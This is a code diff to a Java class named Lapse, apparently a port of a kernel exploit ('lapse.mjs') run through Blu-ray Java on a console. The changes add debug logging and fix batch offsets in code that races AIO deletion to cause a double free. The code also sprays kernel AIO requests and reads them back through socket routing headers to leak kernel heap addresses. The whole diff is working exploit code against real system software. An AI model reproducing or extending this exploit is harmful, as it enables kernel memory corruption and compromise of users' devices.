@@ -22,7 +22,6 @@ import org.bdj.api.Buffer;
 import org.bdj.lapse.LibKernel.PthreadBarrier;
 import org.bdj.lapse.LibKernel.AioErrorArray;
 import org.bdj.lapse.LibKernel.AioRWRequestArray;
-import org.bdj.lapse.LibKernel.AioSubmitId;
 import org.bdj.lapse.LibKernel.AioSubmitIdArray;
 import org.bdj.lapse.LibKernel.Evf;
 import org.bdj.lapse.LibKernel.Socket;
@@ -308,11 +307,6 @@ public class Lapse extends Thread {
 			for (int attempt = 0; attempt < NUM_FREE_ATTEMPTS; attempt++) {
 				log("DoubleFree: attempt " + attempt + " of " + NUM_FREE_ATTEMPTS);
 
-				// FIXME: Touching the console during this loop makes panics MUCH more likely
-				// To be fair the console is kind of a clown car operation and every log call does
-				// various kinds of JVM thread synchronization nonsense. It should really be fixed.
-				enableLogging = false;
-
 				Socket client, connection;
 				if (SINGLECORE) {
 					client = k.new Socket(LibKernel.AF_INET, LibKernel.SOCK_STREAM, 0);
@@ -422,7 +416,6 @@ public class Lapse extends Thread {
 							issuedDelete = true;
 						}
 					} catch (Exception e) {
-						enableLogging = true; // FIXME
 						log("DoubleFree: error in main thread aio_multi_delete section:");
 						log(e);
 						issuedDelete = false;
@@ -443,8 +436,6 @@ public class Lapse extends Thread {
 					log("-> waiting for thread");
 					racer.join();
 				}
-
-				enableLogging = true; // FIXME
 
 				if (issuedDelete) {
 					int mainErrCode = mainErr.get(0).get();
@@ -766,20 +757,27 @@ public class Lapse extends Thread {
 
 				inSocket.getRthdr(buf);
 
+				log("-> spray_aio");
+
 				// spray_aio (note lapse.mjs specifically uses WRITE here, not sure if it matters)
 				for (int i = 0; i < NUM_HANDLES; i++) {
-					AioSubmitIdArray batchIds = ids.slice(i * NUM_HANDLES, NUM_HANDLES);
+					AioSubmitIdArray batchIds = ids.slice(i * NUM_ELEMS, NUM_ELEMS);
 					k.aioSubmitCmd(k.AIO_CMD_MULTI_WRITE, reqs, batchIds);
 				}
+
+				log("-> spray_aio returned");
 
 				inSocket.getRthdr(buf);
 
 				boolean verified = false;
 				int offset = 0;
 				for (int i = 0; i < buf.size(); i += 0x80) {
+					log("-> checking offset i=0x" + Integer.toHexString(i));
 					// lapse.mjs calls this entire block verify_reqs2
 					// FIXME: move into a utility function maybe?
-					if (buf.getInt(i) != LibKernel.AIO_CMD_WRITE) {
+					if (buf.getInt(i) != LibKernel.AIO_CMD_WRITE &&
+						// FIXME: This isn't in the original code but maybe...?
+						buf.getInt(i) != LibKernel.AIO_CMD_MULTI_WRITE) {
 						continue; // try verify_reqs2 with another offset
 					}
 					// We're looking for kernel heap addresses, which are prefixed with 0xffff_xxxx
@@ -788,12 +786,14 @@ public class Lapse extends Thread {
 					// Check if offsets 0x10 to 0x20 look like a kernel heap address
 					boolean found = false;
 					for (int j = 0x10; j <= 0x20; j += 8) {
+						log("--> checking offset i+j=0x" + Integer.toHexString(i+j));
 						if (buf.getShort(i + j + 6) != 0xffff) {
 							found = false; // can stop looking
 							break;
 						}
 						heapPrefix = buf.getShort(i + j + 4);
 						found = true;
+						log("--> found heap prefix: 0x" + Integer.toHexString(heapPrefix));
 					}
 					if (!found) {
 						continue; // try verify_reqs2 with another offset
@@ -802,22 +802,27 @@ public class Lapse extends Thread {
 					// was initialized with zeroes so all padding bytes must be 0.
 					int state = buf.getInt(i + 0x38);
 					int padding = buf.getInt(i + 0x38 + 4);
+					log("-> state 0x" + Integer.toHexString(state) + " padding 0x" + Integer.toHexString(padding));
 					if (!(0 < state && state <= 4) || padding != 0) {
 						continue; // try verify_reqs2 with another offset
 					}
 					// Check reqs2.ar2_file, must be NULL since we passed a bad fd to aio_submit_cmd
 					long file = buf.getLong(i + 0x40);
+					log("-> file: 0x" + Long.toHexString(file));
 					if (file != 0) {
 						continue; // try verify_reqs2 with another offset
 					}
 					// Check if offsets 0x48 to 0x50 look like a kernel address
 					found = false;
 					for (int j = 0x48; j <= 0x50; j += 8) {
+						log("--> checking offset i+j=0x" + Integer.toHexString(i+j) + ": 0x" +
+							Long.toHexString(buf.getLong(i+j)));
 						if (buf.getShort(i + j + 6) == 0xffff) {
 							// Ignore kernel ELF addresses
 							if (buf.getShort(i + j + 4) != 0xffff) {
 								if (buf.getShort(i + j + 4) == heapPrefix) {
 									found = true;
+									log("--> matches heap prefix!");
 								}
 							}
 							// offset 0x48 can be NULL
@@ -833,6 +838,8 @@ public class Lapse extends Thread {
 					offset = i;
 					break;
 				}
+
+				log("-> cancel/poll/delete");
 
 				k.aioUtilBatchCancelPollDelete(ids);
 
@@ -905,8 +912,8 @@ public class Lapse extends Thread {
 
 				// spray_aio
 				for (int i = 0; i < NUM_BATCHES; i++) {
-					AioSubmitIdArray batchIds = ids.slice(i * NUM_BATCHES, NUM_BATCHES);
-					k.aioSubmitCmd(k.AIO_CMD_MULTI_READ, reqs, batchIds);
+					AioSubmitIdArray batchIds = ids.slice(i * NUM_ELEMS, NUM_ELEMS);
+					k.aioSubmitCmd(k.AIO_CMD_READ, reqs, batchIds);
 				}
 
 				int written = inSocket.getRthdr(buf);
